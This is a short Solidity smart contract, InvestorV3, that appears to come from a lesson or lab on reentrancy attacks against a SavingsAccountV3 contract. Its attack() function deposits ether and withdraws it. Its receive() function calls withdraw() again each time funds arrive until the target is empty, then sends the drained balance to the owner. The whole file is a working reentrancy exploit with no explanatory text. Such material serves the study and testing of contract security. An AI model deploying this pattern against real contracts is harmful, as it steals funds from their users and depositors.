// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
// import "hardhat/console.sol";

interface ISavingsAccountV3 {
  function deposit() external payable;

  function withdraw() external;
}

contract InvestorV3 is Ownable {
  ISavingsAccountV3 public immutable savingsAccountV3;

  constructor(address savingsAccountV3ContractAddress) {
    savingsAccountV3 = ISavingsAccountV3(savingsAccountV3ContractAddress);
  }

  function attack() external payable onlyOwner {
    savingsAccountV3.deposit{ value: msg.value }();
    savingsAccountV3.withdraw();
  }

  receive() external payable {
    if (address(savingsAccountV3).balance > 0) {
      savingsAccountV3.withdraw();
    } else {
      payable(owner()).transfer(address(this).balance);
    }
  }
}

// console.log("");
// console.log("Reentring...");
